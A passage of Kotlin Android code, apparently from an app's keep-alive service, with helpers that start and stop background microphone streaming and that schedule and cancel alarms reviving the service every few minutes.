            } catch (_: Throwable) {}
        }

        fun startBackgroundMic(context: Context): Boolean {
            val appContext = context.applicationContext ?: context
            val intent = Intent(appContext, PulseKeepAliveService::class.java).apply {
                action = ACTION_START_BG_MIC
                putExtra(EXTRA_FROM_BOOT, false)
            }
            return try {
                ContextCompat.startForegroundService(appContext, intent)
                true
            } catch (_: Throwable) {
                false
            }
        }

        fun stopBackgroundMic(context: Context) {
            val appContext = context.applicationContext ?: context
            if (!_isServiceRunning.value) {
                _isBackgroundMicStreaming.value = false
                return
            }
            val intent = Intent(appContext, PulseKeepAliveService::class.java).apply {
                action = ACTION_STOP_BG_MIC
            }
            try {
                appContext.startService(intent)
            } catch (_: Throwable) {}
        }

        private fun scheduleImmediateRevive(context: Context, delayMs: Long) {
            try {
                val am = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
                val intent = Intent(context, BootRestartReceiver::class.java).apply {
                    action = BootRestartReceiver.ACTION_REVIVE_KEEPALIVE
                }
                val pi = PendingIntent.getBroadcast(
                    context,
                    9412,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                val triggerAt = SystemClock.elapsedRealtime() + delayMs
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    am.setAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
                } else {
                    am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAt, pi)
                }
            } catch (_: Throwable) {}
        }

        fun scheduleWatchdogAlarm(context: Context) {
            try {
                val am = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
                val intent = Intent(context, BootRestartReceiver::class.java).apply {
                    action = BootRestartReceiver.ACTION_REVIVE_KEEPALIVE
                }
                val pi = PendingIntent.getBroadcast(
                    context,
                    9413,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )
                am.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 5 * 60 * 1000L,
                    5 * 60 * 1000L,
                    pi
                )
            } catch (_: Throwable) {}
        }

        fun cancelWatchdogAlarm(context: Context) {
            try {
                val am = context.getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
                listOf(9412, 9413).forEach { reqCode ->
                    val intent = Intent(context, BootRestartReceiver::class.java).apply {
                        action = BootRestartReceiver.ACTION_REVIVE_KEEPALIVE
                    }
                    val pi = PendingIntent.getBroadcast(
                        context,
                        reqCode,
                        intent,
                        PendingIntent.FLAG_NO_CREATE or PendingIntent.FLAG_IMMUTABLE
                    )
                    if (pi != null) am.cancel(pi)
                }
            } catch (_: Throwable) {}
        }
    }
}
